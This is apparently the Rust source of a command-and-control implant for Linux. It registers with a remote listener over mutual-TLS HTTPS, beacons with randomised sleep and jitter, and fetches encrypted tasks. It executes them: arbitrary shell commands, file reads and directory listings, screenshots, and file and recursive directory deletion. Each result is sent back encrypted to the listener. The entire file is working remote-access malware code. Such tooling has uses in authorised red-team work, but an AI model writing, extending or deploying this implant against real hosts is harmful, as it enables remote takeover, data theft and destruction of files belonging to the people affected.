use reqwest::header::{HeaderMap, USER_AGENT};
use std::{
    collections::HashMap,
    fs::File,
    io::{self, Error, ErrorKind, Write},
    thread,
    time,
    process::Command
};
use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret, StaticSecret};

use crate::{
    core::{
        postdata::{CipherData, PlainData, RegisterAgentData},
        tasks::{
            linux::shell::shell,
            screenshot::screenshot
        }
    },
    Config,
    config::listener,
    crypto::aesgcm::{cipher, decipher, EncMessage},
    utils::random::{random_name, random_sleeptime},
};

pub async fn run(config: Config) -> Result<(), Error> {
    // Get agent into for registration
    let agent_name =  random_name("agent".to_owned());
    let hostname = match Command::new("hostname").output() {
        Ok(h) => {
            String::from_utf8(h.stdout).unwrap().trim().to_string()
        },
        _ => String::from("unknown"),
    };
    let os = std::env::consts::OS.to_string();
    let arch = std::env::consts::ARCH.to_string();
    let listener_url = format!(
        "{}://{}:{}/",
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
    );

    let rad = RegisterAgentData::new(
        agent_name.to_string(),
        hostname.to_string(),
        os.to_string(),
        arch.to_string(),
        listener_url.to_string(),
        config.my_public_key,
    );

    // Initialize client with certificates
    let root_cert = reqwest::Certificate::from_pem(
        config.listener.https_root_cert.as_bytes()
    ).unwrap();
    let client_certs = [
        config.listener.https_client_cert,
        config.listener.https_client_key,
    ].concat();
    let client_id = reqwest::Identity::from_pem(
        client_certs.as_bytes()
    ).unwrap();

    let client = reqwest::Client::builder()
        .use_rustls_tls()
        .identity(client_id)
        .add_root_certificate(root_cert)
        // .danger_accept_invalid_certs(true)
        .build()
        .unwrap();

    // Prepare HTTP request headers
    let mut headers = HeaderMap::new();
    headers.insert(
        USER_AGENT,
        config.listener.user_agent.parse().unwrap(),
    );

    let mut sleeptime = config.sleep.clone();

    // Agent registration process
    let mut registered = false;
    while !registered {
        thread::sleep(
            random_sleeptime(sleeptime.to_owned(), config.jitter.to_owned())
        );
    
        // Register agent
        let response = match client
            .post(format!("{}{}", listener_url.to_string(), "r"))
            .headers(headers.clone())
            .json(&rad)
            .send()
            .await
        {
            Ok(resp) => {
                registered = true;
                resp.text().await.unwrap()
            },
            Err(_) => continue,
        };
        // println!("{}", response);
    }

    let plaindata = PlainData::new(agent_name.to_string());

    loop {
        // TODO: Implement graceful shutdown

        thread::sleep(
            random_sleeptime(sleeptime.to_owned(), config.jitter.to_owned())
        );

        // Get task
        let task = match client
            .post(format!("{}{}", listener_url.to_string(), "t/a"))
            .headers(headers.clone())
            .json(&plaindata)
            .send()
            .await
        {
            Ok(resp) => {
                let resp = resp.text().await.unwrap();
                if resp == "" {
                    continue;
                }

                let cipherdata: CipherData = serde_json::from_str(&resp).unwrap();
                let deciphered_task = decipher(
                    EncMessage { ciphertext: cipherdata.c, nonce: cipherdata.n },
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                );
                String::from_utf8(deciphered_task).unwrap()
            },
            Err(e) => {
                continue;
            }
        };

        // println!("Task: {task}");

        // Execute task
        let task_args = match shellwords::split(&task) {
            Ok(args) => args,
            Err(_) => continue,
        };

        if task_args.len() == 0 {
            continue;
        }

        match task_args[0].as_str() {
            "cat" => {
                match std::fs::read_to_string(task_args[1].as_str()) {
                    Ok(contents) => {
                        post_task_result(
                            contents.as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        ).await;
                    }
                }
            }
            "cd" => {
                match std::env::set_current_dir(task_args[1].as_str()) {
                    Ok(_) => {
                        post_task_result(
                            "The current directory changed successfully.".as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        ).await;
                    }
                }
            }
            "info" => {
                let mut output = String::new();
                output = output + "\n";
                output = output + format!("{:<12} : {}\n", "NAME", agent_name.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "HOSTNAME", hostname.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "OS", 
                    format!("{}/{}", os.to_string(), arch.to_string())).as_str();
                output = output + format!("{:<12} : {}\n", "LISTENER", listener_url.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "SLEEP", sleeptime.to_string()).as_str();
                output = output + format!("{:<12} : {}\n", "JITTER", config.jitter.to_string()).as_str();

                post_task_result(
                    output.as_bytes(),
                    agent_name.to_string(),
                    listener_url.to_string(),
                    headers.clone(),
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                    &client,
                ).await;
            }
            "ls" => {
                match std::fs::read_dir(task_args[1].as_str()) {
                    Ok(result) => {
                        let mut output = String::new();
                        output = output + "\n";
                        for path in result {
                            if let Ok(entry) = path {
                                let entry_name = entry.path()
                                    .to_string_lossy()
                                    .split("/")
                                    .last()
                                    .unwrap()
                                    .to_string();

                                if let Ok(metadata) = entry.metadata() {
                                    output = output + format!(
                                        "{:<1} {:<20} {}\n",
                                        if metadata.is_dir() { "D" } else { "F" },
                                        entry_name,
                                        metadata.len()
                                    ).as_str();
                                } else {
                                    output = output + format!(
                                        "{}", entry_name).as_str();
                                }
                            }
                        }

                        post_task_result(
                            output.as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        ).await;
                    }
                }
            }
            "pwd" => {
                match std::env::current_dir() {
                    Ok(result) => {
                        post_task_result(
                            result.to_str().unwrap().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        ).await;
                    }
                }
            }
            "rm" => {
                if task_args.len() == 2 {
                    match std::fs::remove_file(task_args[1].as_str()) {
                        Ok(_) => {
                            post_task_result(
                                "The directory removed successfully.".as_bytes(),
                                agent_name.to_string(),
                                listener_url.to_string(),
                                headers.clone(),
                                config.my_secret_key.clone(),
                                config.server_public_key.clone(),
                                &client,
                            ).await;
                        }
                        Err(e) => {
                            post_task_result(
                                e.to_string().as_bytes(),
                                agent_name.to_string(),
                                listener_url.to_string(),
                                headers.clone(),
                                config.my_secret_key.clone(),
                                config.server_public_key.clone(),
                                &client,
                            ).await;
                        }
                    }
                } else {
                    // When the `-r` flag is specified,
                    match std::fs::remove_dir_all(task_args[1].as_str()) {
                        Ok(_) => {
                            post_task_result(
                                "The directory removed successfully.".as_bytes(),
                                agent_name.to_string(),
                                listener_url.to_string(),
                                headers.clone(),
                                config.my_secret_key.clone(),
                                config.server_public_key.clone(),
                                &client,
                            ).await;
                        }
                        Err(e) => {
                            post_task_result(
                                e.to_string().as_bytes(),
                                agent_name.to_string(),
                                listener_url.to_string(),
                                headers.clone(),
                                config.my_secret_key.clone(),
                                config.server_public_key.clone(),
                                &client,
                            ).await;
                        }
                    }
                }
            }
            "screenshot" => {
                match screenshot().await {
                    Ok(result) => {
                        post_task_result(
                            &result,
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        ).await;
                    }
                }
            }
            "shell" => {
                match shell(task_args[1..].join(" ").to_string()).await {
                    Ok(result) => {
                        post_task_result(
                            &result,
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        ).await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.to_string(),
                            listener_url.to_string(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        ).await;
                    }
                }
            }
            "sleep" => {
                sleeptime = task_args[1].parse().unwrap();

                post_task_result(
                    "The sleep time changed successfully.".as_bytes(),
                    agent_name.to_string(),
                    listener_url.to_string(),
                    headers.clone(),
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                    &client,
                ).await;
            }
            "whoami" => {
                let username = format!("{}@{}", whoami::hostname(), whoami::username());
                post_task_result(
                    username.as_bytes(),
                    agent_name.to_string(),
                    listener_url.to_string(),
                    headers.clone(),
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                    &client,
                ).await;
            }
            _ => {
                continue;
            }
        }
    }
    
    Ok(())
}

async fn post_task_result(
    plaindata: &[u8],
    agent_name: String,
    listener_url: String,
    headers: HeaderMap,
    my_secret_key: StaticSecret,
    server_public_key: PublicKey,
    client: &reqwest::Client,
) {
    let cipherdata = CipherData::new(
        agent_name,
        plaindata,
        my_secret_key,
        server_public_key,
    );

    client
        .post(format!("{}{}", listener_url, "t/r"))
        .headers(headers)
        .json(&cipherdata)
        .send()
        .await;
}